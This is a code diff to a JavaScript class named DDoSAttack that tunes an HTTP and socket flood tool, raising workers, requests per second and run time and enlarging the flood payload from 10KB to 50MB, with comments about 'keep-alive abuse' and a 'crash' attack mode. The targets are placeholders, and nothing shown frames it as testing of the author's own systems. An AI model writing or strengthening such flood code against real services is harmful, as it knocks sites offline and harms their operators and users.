@@ -23,9 +23,9 @@ class DDoSAttack {
     constructor(options = {}) {
         this.target = options.target || TARGET_URL
         this.socketTarget = options.socketTarget || SOCKET_TARGET
-        this.workers = options.workers || 8 // More workers for higher load
-        this.requestsPerSecond = options.requestsPerSecond || 500 // Much higher RPS
-        this.duration = options.duration || 30 // seconds
+        this.workers = options.workers || 12 // Increased workers for more pressure
+        this.requestsPerSecond = options.requestsPerSecond || 1000 // Much higher RPS
+        this.duration = options.duration || 60 // Longer duration
         this.attackType = options.attackType || 'crash' // 'http', 'socket', 'mixed', 'crash'
         this.running = false
         this.stats = {
@@ -200,7 +200,7 @@ if (!isMainThread) {
     // Enhanced HTTP flood with larger payloads and keep-alive abuse
     async function httpFlood() {
         return new Promise((resolve) => {
-            const largePayload = 'x'.repeat(10000) // 10KB payload
+            const largePayload = 'x'.repeat(1024 * 1024 * 50) // 50MB payload (was 10KB)
             const postData = JSON.stringify({
                 attack: largePayload,
                 timestamp: Date.now(),
